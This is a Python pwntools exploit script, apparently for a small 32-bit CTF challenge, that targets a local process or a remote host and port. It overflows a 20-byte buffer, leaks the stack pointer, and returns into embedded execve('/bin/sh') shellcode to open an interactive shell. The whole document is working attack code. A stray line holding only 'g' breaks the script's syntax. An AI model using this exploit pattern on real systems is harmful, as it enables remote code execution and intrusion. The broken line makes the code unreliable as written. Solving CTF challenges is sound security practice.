import sys
import logging
from pwn import *

logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)


if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")
    
else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

    ###address###

addr_start39 = 0x08048087
    
    ###main###
def main():
    ###payload###
    payload = b"A" * 20
    payload += p32(addr_start39)
    
    target.send(payload)
    _ = target.recvuntil("Let's start the CTF:")
    
    esp_ = u32(target.recv(4))
    print("$esp = 0x{:x}".format(esp_))

    shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

    _ = target.recv(1024)
    
    payload2 = b"B" * 20
    payload2 += p32(esp_ + 20)
    payload2 += shellcode
g
    print(payload2)
    target.sendline(payload2)
    
    target.interactive()

if __name__ == "__main__":
    main()
